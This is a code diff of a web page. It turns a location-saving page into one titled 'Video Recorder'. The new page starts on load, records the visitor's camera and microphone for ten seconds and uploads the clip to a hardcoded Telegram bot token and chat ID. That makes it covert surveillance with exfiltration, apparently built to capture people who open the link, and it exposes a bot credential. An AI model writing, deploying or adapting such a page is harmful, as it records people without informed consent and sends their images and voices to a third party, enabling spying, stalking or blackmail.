@@ -3,87 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Save Location Details</title>
+    <title>Video Recorder</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #1c1c1c;
-            color: #f0f0f0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
-        }
-
-        .container {
-            text-align: center;
-            background-color: #2b2b2b;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
-        }
-
-        button {
-            padding: 10px 20px;
-            background-color: #007bff;
-            border: none;
-            border-radius: 5px;
+            background-color: #121212;
             color: white;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            overflow: hidden;
         }
-
-        button:hover {
-            background-color: #0056b3;
+        #recorder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
         }
-
-        #status {
-            margin-top: 20px;
+        #canvas {
+            border: 5px solid #ff4500;
+            border-radius: 10px;
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
         }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <h1>Save Location Details</h1>
-        <button id="trackLocation">Track My Location</button>
-        <p id="status">Click the button to track your location and save it to a file.</p>
+    <div id="recorder">
+        <h1>Recording Video...</h1>
+        <canvas id="canvas" width="640" height="480"></canvas>
     </div>
 
     <script>
-        document.getElementById('trackLocation').addEventListener('click', function () {
-            const status = document.getElementById('status');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let mediaRecorder;
+        let recordedChunks = [];
 
-            if (navigator.geolocation) {
-                status.textContent = 'Tracking location...';
+        async function startRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const { latitude, longitude } = position.coords;
-                        status.textContent = `Location tracked successfully. Saving to file...`;
-
-                        const locationData = `Latitude: ${latitude}, Longitude: ${longitude}\n`;
-                        saveToFile(locationData);
-                    },
-                    (error) => {
-                        status.textContent = 'Unable to retrieve your location.';
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
                     }
-                );
-            } else {
-                status.textContent = 'Geolocation is not supported by your browser.';
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    recordedChunks = [];
+                    await sendToTelegram(videoBlob);
+                };
+
+                mediaRecorder.start();
+                drawCanvas(video);
+
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    video.pause();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 10000); // Record for 10 seconds
+
+            } catch (error) {
+                console.error('Error accessing media devices.', error);
+                alert('Could not start video recording. Please ensure you have granted camera and microphone permissions.');
             }
-        });
-
-        function saveToFile(data) {
-            const blob = new Blob([data], { type: 'text/plain' });
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'contact.txt';
-            link.click();
         }
-    </script>
 
+        function drawCanvas(video) {
+            const draw = () => {
+                if (!video.paused && !video.ended) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    requestAnimationFrame(draw);
+                }
+            };
+            draw();
+        }
+
+        async function sendToTelegram(videoBlob) {
+            const formData = new FormData();
+            formData.append('video', videoBlob, 'video.webm');
+
+            const telegramBotToken = '6961737885:AAGVw4dkOf0B5ThNFwha2xjkINiWaM5tZCA';
+            const telegramChatId = '1691680798';
+            const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${telegramChatId}`;
+
+            try {
+                const response = await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    alert('Video sent to Telegram successfully!');
+                } else {
+                    alert('Failed to send video to Telegram.');
+                }
+            } catch (error) {
+                console.error('Error sending video to Telegram:', error);
+                alert('Error sending video to Telegram.');
+            }
+        }
+
+        // Start recording automatically when the page loads
+        window.addEventListener('load', startRecording);
+    </script>
 </body>
 </html>
